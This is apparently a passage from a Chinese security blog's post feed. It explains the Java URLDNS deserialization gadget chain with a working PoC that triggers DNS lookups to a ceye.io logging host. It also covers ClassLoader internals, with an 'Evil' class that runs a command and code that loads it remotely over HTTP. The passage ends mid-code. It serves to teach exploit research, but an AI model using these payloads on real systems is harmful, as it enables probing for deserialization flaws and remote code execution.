        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><font style="color:rgb(0, 0, 0);">URLDNS</font>使⽤Java内置的类构造，对第三⽅库没有依赖<font style="color:rgb(0, 0, 0);">，只依赖原生类，没有</font><font style="color:rgb(0, 0, 0);">JDK</font><font style="color:rgb(0, 0, 0);">版本限制。它不会执行命令，只会触发</font><font style="color:rgb(0, 0, 0);">DNS</font><font style="color:rgb(0, 0, 0);">解析，因此通常用来探测是否存在反序列化漏洞。</font></p><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject -&gt; HashMap#put -&gt; HashMap#putVal -&gt; HashMap#hash -&gt; URL#hashcode -&gt; URLStreamHandler#hashcode -&gt; URLStreamHandler#getHostAddress</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在Java内置的<font style="color:#080808;">java.net.URL</font><font style="color:#080808;background-color:#ffffff;">类中，</font><font style="background-color:#ffffff;">存</font>在的equals方法和hashCode方法都具有一个有趣的特性，在对URL对象进行比较时（使用equals方法或hashCode方法）会触发一次DNS解析<font style="color:rgb(0, 0, 0);">。</font></p><p><img src="/2023/04/22/URLDNS/1707275701118-cc0b6db9-4c30-42fe-bb33-731a2a06e776.png"></p><p><font style="color:#080808;">java.net.URL#equals</font><font style="color:rgb(0, 0, 0);">方法重写了</font><font style="color:rgb(0, 0, 0);">Object</font><font style="color:rgb(0, 0, 0);">的判断，调用</font><font style="color:#080808;">java.net.</font><font style="color:rgba(0, 0, 0, 0.8);">URLStreamHandler#equals</font><font style="color:rgb(0, 0, 0);">方法进行判断，</font><font style="color:#080808;">java.net.</font><font style="color:rgba(0, 0, 0, 0.8);">URLStreamHandler#equals</font><font style="color:rgb(0, 0, 0);">方法先判断</font><font style="color:rgb(0, 0, 0);">URL</font><font style="color:rgb(0, 0, 0);">对象的锚点（引用）是否相同，并调用</font><font style="color:#080808;">java.net.</font><font style="color:rgba(0, 0, 0, 0.8);">URLStreamHandler#sameFile</font><font style="color:rgb(0, 0, 0);">方法比较传入的两个</font><font style="color:rgb(0, 0, 0);">URL</font><font style="color:rgb(0, 0, 0);">对象</font></p><p><img src="/2023/04/22/URLDNS/1707275894132-626d17d4-be94-4e72-9f91-b18a6acc3e44.png"></p><p><font style="color:#080808;">java.net.</font><font style="color:rgba(0, 0, 0, 0.8);">URLStreamHandler#sameFile</font><font style="color:rgb(0, 0, 0);">方法中对</font><font style="color:rgb(0, 0, 0);">URL</font><font style="color:rgb(0, 0, 0);">对象的协议、文件名和端口号和主机名进行比较。</font></p><p><img src="/2023/04/22/URLDNS/1707276202385-05f48e38-7214-47e9-aad4-f0dc3a3c7266.png"></p><p><font style="color:#080808;">java.net.</font><font style="color:rgba(0, 0, 0, 0.8);">URLStreamHandler#sameFile</font><font style="color:rgb(0, 0, 0);">方法</font><font style="color:#080808;">调用</font><font style="color:#080808;">java.net.</font><font style="color:rgba(0, 0, 0, 0.8);">URLStreamHandler#</font><font style="color:rgb(0, 0, 0);">hostsEqual</font><font style="color:rgb(0, 0, 0);">方法进行主机名比较，其中调用</font><font style="color:#080808;">java.net.</font><font style="color:rgba(0, 0, 0, 0.8);">URLStreamHandler#getHostAddress</font><font style="color:rgb(0, 0, 0);">方法对要比较的两个</font><font style="color:rgb(0, 0, 0);">URL</font><font style="color:rgb(0, 0, 0);">进行请求解析</font><font style="color:rgb(0, 0, 0);">IP</font><font style="color:rgb(0, 0, 0);">地址并比较，通过</font><font style="color:rgb(0, 0, 0);">java.net.InetAddress#getByName</font><font style="color:rgb(0, 0, 0);">方法对</font><font style="color:rgb(0, 0, 0);">host</font><font style="color:rgb(0, 0, 0);">进行解析，从而触发</font><font style="color:rgb(0, 0, 0);">DNS</font><font style="color:rgb(0, 0, 0);">请求。</font></p><p><img src="/2023/04/22/URLDNS/1707403094492-287a4020-0cf9-4371-b73e-8bbec590fc22.png"></p><p><img src="/2023/04/22/URLDNS/1707404997100-e657d17e-88a5-4aac-8a58-9073843b08f9.png"></p><p><font style="color:#080808;">java.net.URL#hashcode</font><font style="color:rgb(0, 0, 0);">将一个对象映射为一个整型的值，调用</font><font style="color:#080808;">java.net.</font><font style="color:rgba(0, 0, 0, 0.8);">URLStreamHandler#hashcode</font><font style="color:rgb(0, 0, 0);">方法。</font></p><p><img src="/2023/04/22/URLDNS/1707405283129-dfe61cd1-dfd0-40ca-9ce7-d49d295115e5.png"></p><p><font style="color:#080808;">java.net.</font><font style="color:rgba(0, 0, 0, 0.8);">URLStreamHandler#hashcode</font><font style="color:rgb(0, 0, 0);">方法通用会调用</font><font style="color:#080808;">java.net.</font><font style="color:rgba(0, 0, 0, 0.8);">URLStreamHandler#getHostAddress</font><font style="color:rgb(0, 0, 0);">方法，从而触发</font><font style="color:rgb(0, 0, 0);">DNS</font><font style="color:rgb(0, 0, 0);">请求。</font></p><p><img src="/2023/04/22/URLDNS/1707405341626-987e9d8a-3fdc-4283-9572-a5f3cfe1af3d.png"></p><p>接着需要找一个能够触发到<font style="color:#080808;">java.net.URL#equals</font><font style="color:rgb(0, 0, 0);">方法或</font><font style="color:#080808;">java.net.URL#hashcode</font><font style="color:rgb(0, 0, 0);">方法的点，这里利用</font><font style="color:rgb(0, 0, 0);">Java</font><font style="color:rgb(0, 0, 0);">内置的类</font><font style="color:rgb(0, 0, 0);">HashMap</font><font style="color:rgb(0, 0, 0);">或者</font><font style="color:rgb(0, 0, 0);">HashTable</font><font style="color:rgb(0, 0, 0);">都行。</font></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>在PoC中，先自定义了URLStreamHandler的子类SilentURLStreamHandler，在初始化URL对象时传入，那么在HashMap#put方法触发的hash计算在调用到URLStreamHandler#getHostAddress方法时，将调用自定义的SilentURLStreamHandler#getHostAddress方法，从而避免在序列化过程中触发DNS查询，而put之后则是利用反射将URL对象的hashCode的值重新改为-1，从而来满足java.net.URL#hashcode方法要求，完成后续触发。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.urldns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNSDeserialize</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">SilentURLStreamHandler</span> <span class="variable">silentURLStreamHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, <span class="string">&quot;http://fgtee4.ceye.io&quot;</span>, silentURLStreamHandler);</span><br><span class="line">        hashMap.put(url, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(hashMap);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ClassLoader</title>
      <link href="/2023/04/14/ClassLoader/"/>
      <url>/2023/04/14/ClassLoader/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">是一个依赖于</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">实现的跨平台的开发语言。</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">程序在运行前需要先编译成</font><font style="color:rgb(51, 51, 51);">class</font><font style="color:rgb(51, 51, 51);">文件，</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">类初始化的时候会调用</font><font style="color:rgb(51, 51, 51);">java.lang.ClassLoader</font><font style="color:rgb(51, 51, 51);">加载类字节码，</font><font style="color:rgb(51, 51, 51);">ClassLoader</font><font style="color:rgb(51, 51, 51);">会调用</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">的</font><font style="color:rgb(51, 51, 51);">native</font><font style="color:rgb(51, 51, 51);">方法来定义一个</font><font style="color:rgb(51, 51, 51);">java.lang.Class</font><font style="color:rgb(51, 51, 51);">实例。</font></p><h2 id="类加载器分类"><a href="#类加载器分类" class="headerlink" title="类加载器分类"></a>类加载器分类</h2><h3 id="JVM默认类加载器"><a href="#JVM默认类加载器" class="headerlink" title="JVM默认类加载器"></a>JVM默认类加载器</h3><p><font style="color:rgb(51, 51, 51);">在</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">类加载器中最顶层的是</font>Bootstrap ClassLoader（引导类加载器）<font style="color:rgb(51, 51, 51);">、</font>Extension ClassLoader（扩展类加载器）<font style="color:rgb(51, 51, 51);">和</font>App ClassLoader（系统类加载器）<font style="color:rgb(51, 51, 51);">，</font>AppClassLoader<font style="color:rgb(51, 51, 51);">是默认的类加载器，当不指定类加载器的情况下进行类加载时，默认会使用</font>AppClassLoader<font style="color:rgb(51, 51, 51);">加载类。</font></p><h4 id="BootstrapClassLoader"><a href="#BootstrapClassLoader" class="headerlink" title="BootstrapClassLoader"></a>BootstrapClassLoader</h4><p><font style="color:rgb(51, 51, 51);">引导类加载器</font><font style="color:rgb(51, 51, 51);">BootstrapClassLoader</font><font style="color:rgb(51, 51, 51);">底层原生代码由</font><font style="color:rgb(51, 51, 51);">C++</font><font style="color:rgb(51, 51, 51);">语言进行编写，属于</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">一部分，不继承</font><font style="color:rgb(51, 51, 51);">java.lang.ClassLoader</font><font style="color:rgb(51, 51, 51);">类，也没有父加载器，主要负责加载核心</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">库，即</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">本身，存储在</font><font style="color:rgb(51, 51, 51);">&#x2F;jre&#x2F;lib&#x2F;rt.jar</font><font style="color:rgb(51, 51, 51);">目录当中，该目录当中的类都是由</font><font style="color:rgb(51, 51, 51);">BootstrapClassLoader</font><font style="color:rgb(51, 51, 51);">来加载。</font></p><p><font style="color:rgb(51, 51, 51);">同时，为了安全考虑，</font><font style="color:rgb(51, 51, 51);">BootstrapClassLoader</font><font style="color:rgb(51, 51, 51);">只加载包名为</font><font style="color:rgb(51, 51, 51);">java</font><font style="color:rgb(51, 51, 51);">、</font><font style="color:rgb(51, 51, 51);">javax</font><font style="color:rgb(51, 51, 51);">、</font><font style="color:rgb(51, 51, 51);">sun</font><font style="color:rgb(51, 51, 51);">等开头的类。</font></p><h4 id="ExtensionsClassLoader"><a href="#ExtensionsClassLoader" class="headerlink" title="ExtensionsClassLoader"></a>ExtensionsClassLoader</h4><p><font style="color:rgb(51, 51, 51);">扩展类加载器</font><font style="color:rgb(51, 51, 51);">ExtensionsClassLoader</font><font style="color:rgb(51, 51, 51);">由</font><font style="color:rgb(51, 51, 51);">sun.misc.Launcher$ExtClassLoader</font><font style="color:rgb(51, 51, 51);">类实现，用来在</font><font style="color:rgb(51, 51, 51);">&#x2F;jre&#x2F;lib&#x2F;ext</font><font style="color:rgb(51, 51, 51);">或者</font><font style="color:rgb(51, 51, 51);">java.ext.dirs</font><font style="color:rgb(51, 51, 51);">中指明的目录加载</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">的扩展库。</font></p><h4 id="AppClassLoader"><a href="#AppClassLoader" class="headerlink" title="AppClassLoader"></a>AppClassLoader</h4><p><font style="color:rgb(51, 51, 51);">系统类加载器</font><font style="color:rgb(51, 51, 51);">AppClassLoader</font><font style="color:rgb(51, 51, 51);">由</font><font style="color:rgb(51, 51, 51);">sun.misc.Launcher$AppClassLoader</font><font style="color:rgb(51, 51, 51);">实现，一般通过</font><font style="color:rgb(51, 51, 51);">java.class.path</font><font style="color:rgb(51, 51, 51);">或者</font><font style="color:rgb(51, 51, 51);">Classpath</font><font style="color:rgb(51, 51, 51);">环境变量来加载</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">类。通常使用这个加载类来加载</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">应用类，</font><font style="color:rgb(51, 51, 51);">ClassLoader.getSystemClassLoader()</font><font style="color:rgb(51, 51, 51);">返回的系统类加载器也是</font><font style="color:rgb(51, 51, 51);">AppClassLoader</font><font style="color:rgb(51, 51, 51);">。</font></p><h3 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h3><p><font style="color:rgb(51, 51, 51);">除了上述</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">自带提供的类加载器，还可以通过继承</font><font style="color:rgb(51, 51, 51);">java.lang.ClassLoader</font><font style="color:rgb(51, 51, 51);">类的方式实现自定义类加载器。</font></p><p>在ClassLoader里面有三个重要的方法: loadClass、findClass和defineClass。</p><p>loadClass方法是加载目标类的入口，它首先会查找当前ClassLoader以及它的双亲里面是否已经加载了目标类，如果没有找到就会让双亲尝试加载。当双亲都无法进行加载时，会调用findClass方法让自定义加载器自己来加载目标类，ClassLoader的findClass方法是需要子类来覆盖的，不同的加载器将使用不同的逻辑来获取目标类的字节码，拿到字节码后再调用defineClass方法将字节码转换成Class对象。</p><p>Class.forName和ClassLoader.loadClass都是常见的类动态加载方式，但是它们之间也有着区别。</p><ol><li>那就是Class.forName方法可以获取原生类型的Class，而ClassLoader.loadClass方法则会报错。</li><li><font style="color:rgb(51, 51, 51);">Class.forName</font><font style="color:rgb(51, 51, 51);">方法默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用</font><font style="color:rgb(51, 51, 51);">Class.forName(“类名”, 是否初始化类, 类加载器)</font><font style="color:rgb(51, 51, 51);">，而</font><font style="color:rgb(51, 51, 51);">ClassLoader.loadClass</font><font style="color:rgb(51, 51, 51);">默认不会初始化类方法。</font></li></ol><p><font style="color:rgb(51, 51, 51);">自定义加载器实现过程伪代码如下：</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 加载入口，定义了双亲委派规则</span></span><br><span class="line">  Class <span class="title function_">loadClass</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="comment">// 是否已经加载了</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">t</span> <span class="operator">=</span> <span class="built_in">this</span>.findFromLoaded(name);</span><br><span class="line">    <span class="keyword">if</span>(t == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 交给双亲</span></span><br><span class="line">      t = <span class="built_in">this</span>.parent.loadClass(name)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(t == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 双亲都不行，只能靠自己了</span></span><br><span class="line">      t = <span class="built_in">this</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 交给子类自己去实现</span></span><br><span class="line">  Class <span class="title function_">findClass</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> ClassNotFoundException();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 组装Class对象</span></span><br><span class="line">  Class <span class="title function_">defineClass</span><span class="params">(<span class="type">byte</span>[] code, String name)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> buildClassFromCode(code, name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">  Class <span class="title function_">findClass</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="comment">// 寻找字节码</span></span><br><span class="line">    <span class="type">byte</span>[] code = findCodeFromSomewhere(name);</span><br><span class="line">    <span class="comment">// 组装Class对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(code, name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ClassLoader类加载流程"><a href="#ClassLoader类加载流程" class="headerlink" title="ClassLoader类加载流程"></a>ClassLoader类加载流程</h2><ol><li>首先，ClassLoader<font style="color:rgb(51, 51, 51);">会调用</font><font style="color:#080808;background-color:#ffffff;">loadClass</font><font style="color:rgb(51, 51, 51);">方法加载类</font></li><li><font style="color:rgb(51, 51, 51);">loadClass</font><font style="color:rgb(51, 51, 51);">方法先调用</font>findLoadedClass<font style="color:rgb(51, 51, 51);">方法检查类是否已经初始化，如果</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">已初始化过该类则直接返回类对象</font></li><li><font style="color:rgb(51, 51, 51);">如果创建当前</font>ClassLoader<font style="color:rgb(51, 51, 51);">时传入了父类加载器，就使用父类加载器加载类，否则使用</font>Bootstrap ClassLoader<font style="color:rgb(51, 51, 51);">进行加载</font></li><li><font style="color:rgb(51, 51, 51);">如果上一步无法加载类，那么调用自身的</font>findClass<font style="color:rgb(51, 51, 51);">方法尝试加载类</font></li><li><font style="color:rgb(51, 51, 51);">如果当前的</font>ClassLoader<font style="color:rgb(51, 51, 51);">没有重写了</font>findClass<font style="color:rgb(51, 51, 51);">方法，那么直接返回类加载失败异常；如果当前类重写了</font>findClass<font style="color:rgb(51, 51, 51);">方法并通过传入的类名找到了对应的类字节码，那么调用</font>defineClass<font style="color:rgb(51, 51, 51);">方法去</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">中注册该类</font></li><li><font style="color:rgb(51, 51, 51);">如果调用</font><font style="color:rgb(51, 51, 51);">loadClass</font><font style="color:rgb(51, 51, 51);">的时候传入的</font>resolve<font style="color:rgb(51, 51, 51);">参数为</font><font style="color:rgb(51, 51, 51);">true</font><font style="color:rgb(51, 51, 51);">，那么还需要调用</font>resolveClass<font style="color:rgb(51, 51, 51);">方法链接类，默认为</font><font style="color:rgb(51, 51, 51);">false</font><font style="color:rgb(51, 51, 51);"></font></li><li><font style="color:rgb(51, 51, 51);">最后，返回一个被</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">加载后的</font>java.lang.Class<font style="color:rgb(51, 51, 51);">类对象</font></li></ol><p><img src="/2023/04/14/ClassLoader/1708280844219-0d6fcdd5-edc7-4a74-9b4c-9ac023e84d8b.png"></p><h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><p>由于AppClassLoader只负责加载Classpath下的类库，因此当AppClassLoader遇到没有加载的系统类库时，会将系统类库的加载工作交给BootstrapClassLoader和ExtensionClassLoader，这就是双亲委派。</p><p>在下图中，AppClassLoader在加载一个未知的类名时，并不是立即去搜寻Classpath，它会首先将这个类名称交给ExtensionClassLoader来加载，如果ExtensionClassLoader可以加载，那么AppClassLoader就不会进行加载，否则的话AppClassLoader会搜索Classpath。ExtensionClassLoader在加载一个未知的类名时，也并不是立即搜寻ext路径，它会首先将类名称交给BootstrapClassLoader来加载，如果BootstrapClassLoader可以加载，ExtensionClassLoader也不会对其进行加载，否则的话才会搜索ext路径下的jar包。</p><p><img src="/2023/04/14/ClassLoader/1708347066695-144e68ff-e4cd-40c8-8e60-b62acc0e3a25.png"></p><p>AppClassLoader、ExtensionClassLoader、BootstrapClassLoader三者之间形成了一个级联的父子关系，优先把任务交给其父亲，当其父亲无法完成任务时才会轮到自己，在每个ClassLoader对象的内部都会存在一个parent属性指向自己的父加载器。<br>    还需要注意的一点是，上图中的ExtensionClassLoader的parent指针是画的虚线，这是因为它的parent的值是null，当parent字段是null时，表示它的父加载器是根加载器，当Class对象的classLoader属性值是null时，就表示这个类也是根加载器加载的。</p><h2 id="动态加载字节码"><a href="#动态加载字节码" class="headerlink" title="动态加载字节码"></a>动态加载字节码</h2><h3 id="URLClassLoader加载远程字节码文件"><a href="#URLClassLoader加载远程字节码文件" class="headerlink" title="URLClassLoader加载远程字节码文件"></a>URLClassLoader加载远程字节码文件</h3><p>URLClassLoader实际上是平时默认使用的AppClassLoader的父类，正常情况下Java会根据配置项sun.boot.class.path和java.class.path中列举到的基础路径（这些路径是经过处理后的java.net.URL类）来寻找class文件来加载，而这个基础路径又分为三种情况。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] URL未以斜杠/结尾，则认为是一个JAR文件，使用JarLoader来寻找类，即为在Jar包中寻找.class文件</span><br><span class="line">[<span class="number">2</span>] URL以斜杠/结尾，且协议名是file，则使用FildLoader来寻找类，即为在本地系统中寻找.class文件</span><br><span class="line">[<span class="number">3</span>] URL以斜杠/结尾，且协议名不是file，则使用最基础的Loader来寻找类</span><br></pre></td></tr></table></figure><p>注意，要利用基础的Loader类来寻找这一点必须是非file协议的情况下，JAVA默认提供了对file,ftp,gopher,http,https,jar,mailto和netdoc协议的支持。</p><ul><li>恶意类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>利用HTTP服务加载class文件</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassloaderTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        URL[] urls = &#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:2223/&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> URLClassLoader.newInstance(urls);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">_class</span> <span class="operator">=</span> loader.loadClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        _class.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/14/ClassLoader/1708349177993-0c9042fe-3018-4996-86f8-cb585a502fda.png"></p><h3 id="ClassLoader加载字节码"><a href="#ClassLoader加载字节码" class="headerlink" title="ClassLoader加载字节码"></a>ClassLoader加载字节码</h3><p>不管是加载远程class文件还是本地的class或jar文件，Java都经历的是下面这三个方法的调用: ClassLoader#loadClass–&gt;ClassLoader#findClass–&gt;ClassLoader#defineClass。</p><p><img src="/2023/04/14/ClassLoader/1708350437868-213c189a-6915-4a16-ada3-cc1e4af14cbd.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] 